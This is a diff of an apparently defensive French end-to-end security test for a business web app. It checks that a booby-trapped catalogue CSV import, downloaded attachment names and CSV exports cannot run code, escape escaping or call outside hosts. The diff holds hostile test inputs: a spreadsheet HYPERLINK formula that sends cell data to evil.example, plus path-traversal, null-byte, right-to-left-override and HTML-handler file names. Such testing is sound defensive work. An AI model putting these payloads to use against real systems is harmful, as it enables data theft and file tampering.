@@ -26,45 +26,6 @@ const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
   const c = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 1500, init: O.INIT }), p = c.p;
   p.on('dialog', d => d.accept().catch(() => {}));
   const dehors = []; p.on('request', r => { const u = r.url(); if (!/^(http:\/\/127\.0\.0\.1|data:|blob:|about:)/.test(u)) dehors.push(u.slice(0, 100)); });
-  // ── 1. l'import ──
-  await p.evaluate(() => aller('produits')); await p.waitForTimeout(600);
-  const nAvant = await p.evaluate(() => PRODUITS.length);
-  await p.evaluate(() => fournTarifs(MES_FOURN.find(o => o.dir) ? MES_FOURN.find(o => o.dir).id : MES_FOURN[0].id)); await p.waitForTimeout(600);
-  const champ = p.locator('[data-fofile]').first();
-  L.v('population : le champ « Choisir le fichier » du catalogue est là', await champ.count() === 1);
-  const t0 = Date.now(); await champ.setInputFiles(CSVF);
-  const prete = await L.attendre(p, () => !!document.querySelector('[data-foimp]'), 60000); const tAnalyse = Date.now() - t0;
-  L.v('population : le fichier piégé de ' + Math.round(fs.statSync(CSVF).size / 1024) + ' Ko est lu et la vérification s\'affiche (en ' + tAnalyse + ' ms)', prete, tAnalyse);
-  L.v('un fichier de 20 000 lignes se lit en moins de 8 secondes (sinon la page se fige : ' + tAnalyse + ' ms)', tAnalyse < 8000, tAnalyse);
-  const V = await p.evaluate(O.LIRE);
-  console.log('  · à la vérification : ', V.sorti.length, 'sorties ;', V.vues.length, 'charges vues échappées');
-  L.v('population : les charges du fichier sont arrivées à l\'écran de vérification (échappées)', V.vues.length >= 2 || (await p.evaluate(() => document.querySelectorAll('[data-foimp]').length)) >= 10, V.vues);
-  L.v('la vérification n\'a laissé sortir AUCUNE charge du fichier (balise, gestionnaire)', V.sorti.length === 0, V.sorti.slice(0, 6));
-  const lu = await p.evaluate(() => { const r = [...document.querySelectorAll('.fo-r')]; return { lignes: r.length, premiere: (r[0] ? r[0].textContent : '').slice(0, 120), aCharge: r.some(x => /¤n20\d¤/.test(x.textContent) || /¤n21\d¤/.test(x.textContent)) }; });
-  console.log('  · écran de vérification :', JSON.stringify(lu));
-  L.v('population : les lignes du fichier piégé s\'affichent à la vérification, charges comprises, en TEXTE (' + lu.lignes + ' lignes)', lu.lignes >= 3 && lu.aCharge, lu);
-  const nImp = await p.evaluate(() => { document.querySelectorAll('[data-foimp]').forEach(i => { if (!i.checked) i.click(); }); return document.querySelectorAll('[data-foimp]:checked').length; });
-  L.v('population : lignes cochées pour l\'import (' + nImp + ')', nImp >= 20, nImp);
-  const t1 = Date.now(); await p.evaluate(() => { const b = document.querySelector('[data-fo="appliquer"]'); if (b) { b.disabled = false; b.click(); } }); await p.waitForTimeout(2500); const tAppl = Date.now() - t1;
-  const A = await p.evaluate(() => { const n = PRODUITS.length; const x = {}; PRODUITS.forEach(o => { if (/¤n\d+¤|HYPERLINK|^[=+@]/.test(o.nom + '|' + o.ref + '|' + o.u + '|' + o.ean)) x[o.id] = { nom: String(o.nom).slice(0, 40), nomLen: String(o.nom).length, ref: String(o.ref).slice(0, 30), u: String(o.u).slice(0, 30), pa: o.pa, pv: o.pv }; });
-    const pas = PRODUITS.filter(o => o.pa != null && (!isFinite(o.pa) || o.pa < 0 || o.pa > 1e7)).map(o => ({ nom: String(o.nom).slice(0, 30), pa: String(o.pa) })); return { n, x, pas, maxNom: Math.max(...PRODUITS.map(o => String(o.nom).length)) }; });
-  console.log('  · produits :', nAvant, '→', A.n, '· posés avec une charge ou une formule :', Object.keys(A.x).length, '· plus long nom :', A.maxNom, '· import appliqué en', tAppl, 'ms');
-  L.v('population : l\'import a créé des produits (' + (A.n - nAvant) + ')', A.n - nAvant >= 3, A.n - nAvant);
-  L.v('population : des produits portant une charge ou une formule sont dans le catalogue', Object.keys(A.x).length >= 3, A.x);
-  L.v('aucun prix infini, négatif ou absurde (> 10 000 000) n\'est entré dans le catalogue', A.pas.length === 0, A.pas.slice(0, 5));
-  L.v('le nom d\'un article reste borné (≤ 500 caractères) : le plus long vaut ' + A.maxNom, A.maxNom <= 500, A.maxNom);
-  const unites = Object.values(A.x).filter(x => x.u && !/^[\p{L}\p{N}\/².³°µ%. -]{1,12}$/u.test(x.u));
-  L.v('l\'unité venue du fichier est une unité (12 signes au plus : lettres, chiffres, / ² ³ ° µ % . -) — sinon elle atteint le Stock brute (injection-02) : ' + JSON.stringify(unites.map(x => x.u.slice(0, 18))), unites.length === 0, unites.slice(0, 3));
-  // balayage : tous les écrans qui montrent le catalogue
-  const routes = await p.evaluate(() => Object.keys(vues()).filter(r => !/-x-/.test(r)));
-  const trouves = new Map(), vusT = new Set(); let nEcrans = 0;
-  for (const r of routes) { try { await Promise.race([p.evaluate(x => aller(x), r), new Promise((_, q) => setTimeout(() => q(new Error('DELAI')), 9000))]); } catch (e) { continue; }
-    await p.waitForTimeout(300); nEcrans++; let R; try { R = await p.evaluate(O.LIRE); } catch (e) { continue; } R.vues.forEach(v => vusT.add(v)); R.sorti.forEach(s => { const k = s.sorte + '|' + s.champ; if (!trouves.has(k)) trouves.set(k, { ...s, ou: r }); });
-    await p.evaluate(() => { try { fermerPanneau(); } catch (e) {} }); }
-  const H = await p.evaluate(() => (window.top.__hits || []).slice());
-  L.v('population : ≥ 30 écrans revisités après l\'import (' + nEcrans + ')', nEcrans >= 30, nEcrans);
-  L.v('AUCUNE charge du fichier de prix n\'est sortie de son texte dans les ' + nEcrans + ' écrans — sorties : ' + trouves.size, trouves.size === 0, [...trouves.values()].slice(0, 6).map(s => s.champ + ' ▸ ' + s.sorte + ' ▸ ' + s.ou));
-  L.v('AUCUN code exécuté depuis le fichier de prix (window.__hits : ' + H.length + ')', H.length === 0, H.slice(0, 6));
   // ── 2. les noms de pièces jointes, téléchargés ──
   const NOMS = ['../../../etc/passwd.pdf', '..\\..\\Windows\\win.ini.pdf', '\u202efdp.exe', 'con.pdf', 'facture.pdf\u0000.exe', 'a'.repeat(600) + '.pdf', '/etc/cron.d/x.pdf', 'C:\\x\\y.pdf', '.bashrc', 'x.pdf '.repeat(3), '<img src=x onerror=1>.pdf', 'faux\u2066pdf.exe'];
   await p.evaluate(N => { N.forEach((n, i) => MAILS.push(mlM('nf' + i, AUJ, '11:5' + (i % 10), { nom: 'Pièces ' + i, mail: 'pj' + i + '@exemple.fr' }, 'Pièce ' + i, 'Voir la pièce jointe.', { pj: [[n, '1 Ko']] }))); }, NOMS);
@@ -121,6 +82,45 @@ const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
   console.log('  · tableaux Véhicules :', JSON.stringify(veh).slice(0, 400));
   L.v('population : les deux exports CSV de Véhicules ont été produits (' + veh.n + ') et contiennent la valeur piégée', veh.n >= 2 && veh.csv.flat().length >= 1, veh);
   L.v('3c. CSV : aucune cellule ne commence par = + @ — ni derrière les guillemets (Excel évalue aussi "=…")', veh.csv.flat().every(c => !/^"?[=+@\t\r]/.test(c)), veh.csv.flat());
+  // ── 1 (en dernier). l'import de catalogue : après 20 000 articles la page est lourde (téléchargements et exports ne partaient plus : rejoué avant, ils partent) ──
+  await p.evaluate(() => aller('produits')); await p.waitForTimeout(600);
+  const nAvant = await p.evaluate(() => PRODUITS.length);
+  await p.evaluate(() => fournTarifs(MES_FOURN.find(o => o.dir) ? MES_FOURN.find(o => o.dir).id : MES_FOURN[0].id)); await p.waitForTimeout(600);
+  const champ = p.locator('[data-fofile]').first();
+  L.v('population : le champ « Choisir le fichier » du catalogue est là', await champ.count() === 1);
+  const t0 = Date.now(); await champ.setInputFiles(CSVF);
+  const prete = await L.attendre(p, () => !!document.querySelector('[data-foimp]'), 60000); const tAnalyse = Date.now() - t0;
+  L.v('population : le fichier piégé de ' + Math.round(fs.statSync(CSVF).size / 1024) + ' Ko est lu et la vérification s\'affiche (en ' + tAnalyse + ' ms)', prete, tAnalyse);
+  L.v('un fichier de 20 000 lignes se lit en moins de 8 secondes (sinon la page se fige : ' + tAnalyse + ' ms)', tAnalyse < 8000, tAnalyse);
+  const V = await p.evaluate(O.LIRE);
+  console.log('  · à la vérification : ', V.sorti.length, 'sorties ;', V.vues.length, 'charges vues échappées');
+  L.v('population : les charges du fichier sont arrivées à l\'écran de vérification (échappées)', V.vues.length >= 2 || (await p.evaluate(() => document.querySelectorAll('[data-foimp]').length)) >= 10, V.vues);
+  L.v('la vérification n\'a laissé sortir AUCUNE charge du fichier (balise, gestionnaire)', V.sorti.length === 0, V.sorti.slice(0, 6));
+  const lu = await p.evaluate(() => { const r = [...document.querySelectorAll('.fo-r')]; return { lignes: r.length, premiere: (r[0] ? r[0].textContent : '').slice(0, 120), aCharge: r.some(x => /¤n20\d¤/.test(x.textContent) || /¤n21\d¤/.test(x.textContent)) }; });
+  console.log('  · écran de vérification :', JSON.stringify(lu));
+  L.v('population : les lignes du fichier piégé s\'affichent à la vérification, charges comprises, en TEXTE (' + lu.lignes + ' lignes)', lu.lignes >= 3 && lu.aCharge, lu);
+  const nImp = await p.evaluate(() => { document.querySelectorAll('[data-foimp]').forEach(i => { if (!i.checked) i.click(); }); return document.querySelectorAll('[data-foimp]:checked').length; });
+  L.v('population : lignes cochées pour l\'import (' + nImp + ')', nImp >= 20, nImp);
+  const t1 = Date.now(); await p.evaluate(() => { const b = document.querySelector('[data-fo="appliquer"]'); if (b) { b.disabled = false; b.click(); } }); await p.waitForTimeout(2500); const tAppl = Date.now() - t1;
+  const A = await p.evaluate(() => { const n = PRODUITS.length; const x = {}; PRODUITS.forEach(o => { if (/¤n\d+¤|HYPERLINK|^[=+@]/.test(o.nom + '|' + o.ref + '|' + o.u + '|' + o.ean)) x[o.id] = { nom: String(o.nom).slice(0, 40), nomLen: String(o.nom).length, ref: String(o.ref).slice(0, 30), u: String(o.u).slice(0, 30), pa: o.pa, pv: o.pv }; });
+    const pas = PRODUITS.filter(o => o.pa != null && (!isFinite(o.pa) || o.pa < 0 || o.pa > 1e7)).map(o => ({ nom: String(o.nom).slice(0, 30), pa: String(o.pa) })); return { n, x, pas, maxNom: Math.max(...PRODUITS.map(o => String(o.nom).length)) }; });
+  console.log('  · produits :', nAvant, '→', A.n, '· posés avec une charge ou une formule :', Object.keys(A.x).length, '· plus long nom :', A.maxNom, '· import appliqué en', tAppl, 'ms');
+  L.v('population : l\'import a créé des produits (' + (A.n - nAvant) + ')', A.n - nAvant >= 3, A.n - nAvant);
+  L.v('population : des produits portant une charge ou une formule sont dans le catalogue', Object.keys(A.x).length >= 3, A.x);
+  L.v('aucun prix infini, négatif ou absurde (> 10 000 000) n\'est entré dans le catalogue', A.pas.length === 0, A.pas.slice(0, 5));
+  L.v('le nom d\'un article reste borné (≤ 500 caractères) : le plus long vaut ' + A.maxNom, A.maxNom <= 500, A.maxNom);
+  const unites = Object.values(A.x).filter(x => x.u && !/^[\p{L}\p{N}\/².³°µ%. -]{1,12}$/u.test(x.u));
+  L.v('l\'unité venue du fichier est une unité (12 signes au plus : lettres, chiffres, / ² ³ ° µ % . -) — sinon elle atteint le Stock brute (injection-02) : ' + JSON.stringify(unites.map(x => x.u.slice(0, 18))), unites.length === 0, unites.slice(0, 3));
+  // balayage : tous les écrans qui montrent le catalogue
+  const routes = await p.evaluate(() => Object.keys(vues()).filter(r => !/-x-/.test(r)));
+  const trouves = new Map(), vusT = new Set(); let nEcrans = 0;
+  for (const r of routes) { try { await Promise.race([p.evaluate(x => aller(x), r), new Promise((_, q) => setTimeout(() => q(new Error('DELAI')), 9000))]); } catch (e) { continue; }
+    await p.waitForTimeout(300); nEcrans++; let R; try { R = await p.evaluate(O.LIRE); } catch (e) { continue; } R.vues.forEach(v => vusT.add(v)); R.sorti.forEach(s => { const k = s.sorte + '|' + s.champ; if (!trouves.has(k)) trouves.set(k, { ...s, ou: r }); });
+    await p.evaluate(() => { try { fermerPanneau(); } catch (e) {} }); }
+  const H = await p.evaluate(() => (window.top.__hits || []).slice());
+  L.v('population : ≥ 30 écrans revisités après l\'import (' + nEcrans + ')', nEcrans >= 30, nEcrans);
+  L.v('AUCUNE charge du fichier de prix n\'est sortie de son texte dans les ' + nEcrans + ' écrans — sorties : ' + trouves.size, trouves.size === 0, [...trouves.values()].slice(0, 6).map(s => s.champ + ' ▸ ' + s.sorte + ' ▸ ' + s.ou));
+  L.v('AUCUN code exécuté depuis le fichier de prix (window.__hits : ' + H.length + ')', H.length === 0, H.slice(0, 6));
   // ── 4. ce que le courriel ajoute aux fiches ──
   const lg = await p.evaluate(() => (window.top.__hits || []).length);
   L.v('aucune requête vers un autre hôte que 127.0.0.1', dehors.length === 0, dehors.slice(0, 4));
